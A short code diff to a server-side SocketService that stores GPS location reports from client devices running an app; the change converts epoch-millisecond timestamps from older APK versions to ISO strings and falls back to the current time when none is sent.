@@ -243,10 +243,17 @@ class SocketService {
           return;
         }
         const gpsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'gps'));
+        // Normalize timestamp: old APKs send epoch millis, new APKs send ISO string
+        let timeValue = data.timestamp || data.time;
+        if (typeof timeValue === 'number') {
+          timeValue = new Date(timeValue).toISOString();
+        } else if (!timeValue) {
+          timeValue = new Date().toISOString();
+        }
         gpsData.push({
           latitude: data.latitude, longitude: data.longitude, accuracy: data.accuracy,
           speed: data.speed, provider: data.provider,
-          time: data.timestamp || data.time || new Date().toISOString(),
+          time: timeValue,
         });
         dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData));
         dbHelpers.addLog('DATA', 'GPS', `GPS location from ${id}`, JSON.stringify({ lat: data.latitude, lng: data.longitude }));
